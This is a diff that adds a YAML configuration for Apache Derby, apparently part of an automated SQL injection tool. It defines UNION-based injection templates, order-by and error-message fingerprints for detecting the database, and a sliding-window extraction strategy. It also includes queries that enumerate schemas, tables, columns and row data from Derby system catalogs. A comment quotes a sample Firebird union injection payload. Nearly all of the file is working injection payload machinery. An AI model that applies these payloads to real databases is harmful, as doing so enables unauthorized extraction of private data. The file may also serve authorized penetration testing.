@@ -1,0 +1,108 @@
+vendor: Derby
+# jdbc:derby://localhost:1527/E:\Dev\db-derby-10.11.1.1-bin\demo\databases\toursdb
+
+resource:
+ info: |
+  select
+      '-'
+      || '${enclose_value_sql}'
+      || current schema
+      || '${enclose_value_sql}'
+      || current_user
+      || '${trail_sql}'
+  from sysibm.sysdummy1
+
+ schema:
+  database: |
+   /**
+    * aggreg function return exec fault
+    * select item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
+    * => use limit 1,1 instead
+    */
+   select
+       '${enclose_value_sql}'
+       || schemaname
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   FROM sys.sysschemas
+   ${limit}
+
+  table: |
+   select
+       '${enclose_value_sql}'
+       || trim(tablename)
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   from sys.systables t
+   inner join sys.sysschemas s on t.schemaid = s.schemaid
+   where schemaname='${database}'
+   ${limit}
+
+  column: |
+   select
+       '${enclose_value_sql}'
+       || trim(columnname)
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   from sys.systables t
+   inner join sys.sysschemas s on t.schemaid = s.schemaid
+   inner join sys.syscolumns c on t.tableid = c.referenceid
+   where schemaname = '${database}'
+   and tablename = '${table}'
+   /**
+    * TODO casting numeric to string not possible with getValues()
+    * => hiding numeric columns
+    * Replace % in like
+    */
+   and columndatatype || '' not like 'DOUBLE%25'
+   and columndatatype || '' not like 'INTEGER%25'
+   and columndatatype || '' not like 'DECIMAL%25'
+   and columndatatype || '' not like 'BLOB%25'
+   ${limit}
+
+  row:
+   query: |
+    select
+        '${enclose_value_sql}'
+        || ${fields}
+        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+    from ${database}.${table}
+    ${limit}
+   fields:
+    field: trim(coalesce(${field.value}, ''))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
+        */
+       '${lead}'
+       || nullif(
+           substr(
+               (${injection}),
+               ${window.char}
+           ),
+           '${trail_sql}'
+       )
+   from sysibm.sysdummy1
+  limit: offset ${limit.value} rows fetch next 1 rows only
+  failsafe: |
+   trim(
+       cast(
+           (1337${indice}7330%2b1)
+           as char(254)
+       )
+   )
+  calibrator: "'%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'"
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - Derby database
+   orderByErrorMessage:
+    - Column position '1337' is out of range for the query expression
+
+ normal:
+  indices: union select ${indices} from sysibm.sysdummy1
+  capacity: (select '${lead}${indice}' || ${calibrator} from sysibm.sysdummy1)
+  orderBy: order by 1337
